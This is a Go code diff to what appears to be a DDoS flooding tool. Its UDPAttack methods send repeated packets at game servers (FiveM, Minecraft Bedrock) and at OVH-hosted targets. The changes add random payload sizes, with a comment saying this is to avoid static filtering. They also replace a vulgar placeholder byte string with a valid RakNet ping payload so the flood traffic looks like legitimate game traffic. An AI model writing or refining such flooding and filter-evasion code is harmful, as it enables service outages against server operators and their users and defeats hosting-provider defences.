@@ -2,8 +2,9 @@ package layer4
 
 import (
 	"context"
+	"crypto/rand"
 	"fmt"
-	"math/rand"
+	mrand "math/rand/v2"
 	"net"
 	"strconv"
 
@@ -57,7 +58,7 @@ func (u *UDPAttack) executeUDP(ctx context.Context) error {
 	}
 	defer conn.Close()
 
-	data := utils.RandomBytes(1024)
+	// Random payload size between 64 and 1024 bytes to avoid static filtering
 	for i := 0; i < 100; i++ {
 		select {
 		case <-ctx.Done():
@@ -65,6 +66,8 @@ func (u *UDPAttack) executeUDP(ctx context.Context) error {
 		default:
 		}
 
+		size := utils.RandInt(64, 1024)
+		data := utils.RandomBytes(size)
 		n, err := conn.Write(data)
 		if err != nil {
 			break
@@ -196,7 +199,7 @@ func (u *UDPAttack) executeFIVEMTOKEN(ctx context.Context) error {
 
 		token := fmt.Sprintf("%s-%s-%s-%s",
 			utils.RandString(8), utils.RandString(4), utils.RandString(4), utils.RandString(12))
-		guid := fmt.Sprintf("%d", 76561197960265728+rand.Int63n(39734735271))
+		guid := fmt.Sprintf("%d", 76561197960265728+mrand.Int64N(39734735271))
 
 		payload := fmt.Sprintf("token=%s&guid=%s", token, guid)
 		n, err := conn.Write([]byte(payload))
@@ -221,16 +224,16 @@ func (u *UDPAttack) executeMCPE(ctx context.Context) error {
 	}
 	defer conn.Close()
 
+	// RakNet Unconnected Ping Payload
+	// 0x01 (Unconnected Ping) + 8 bytes timestamp + 8 bytes magic + 8 bytes client GUID
 	payload := []byte{
-		0x61, 0x74, 0x6f, 0x6d, 0x20, 0x64, 0x61, 0x74,
-		0x61, 0x20, 0x6f, 0x6e, 0x74, 0x6f, 0x70, 0x20,
-		0x6d, 0x79, 0x20, 0x6f, 0x77, 0x6e, 0x20, 0x61,
-		0x73, 0x73, 0x20, 0x61, 0x6d, 0x70, 0x2f, 0x74,
-		0x72, 0x69, 0x70, 0x68, 0x65, 0x6e, 0x74, 0x20,
-		0x69, 0x73, 0x20, 0x6d, 0x79, 0x20, 0x64, 0x69,
-		0x63, 0x6b, 0x20, 0x61, 0x6e, 0x64, 0x20, 0x62,
-		0x61, 0x6c, 0x6c, 0x73,
+		0x01,                                           // ID
+		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp (empty)
+		0x00, 0xff, 0xff, 0x00, 0xfe, 0xfe, 0xfe, 0xfe, 0xfd, 0xfd, 0xfd, 0xfd, 0x12, 0x34, 0x56, 0x78, // Magic
+		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Client GUID
 	}
+	// Add random GUID
+	rand.Read(payload[len(payload)-8:])
 
 	for i := 0; i < 100; i++ {
 		select {
@@ -279,8 +282,8 @@ func (u *UDPAttack) executeOVHUDP(ctx context.Context) error {
 		payloadSize := utils.RandInt(1024, 2048)
 		randomPart := string(utils.RandomBytes(payloadSize))
 
-		method := methods[rand.Intn(len(methods))]
-		path := paths[rand.Intn(len(paths))]
+		method := methods[mrand.IntN(len(methods))]
+		path := paths[mrand.IntN(len(paths))]
 
 		payload := fmt.Sprintf("%s %s%s HTTP/1.1\nHost: %s:%d\r\n\r\n",
 			method, path, randomPart, host, port)
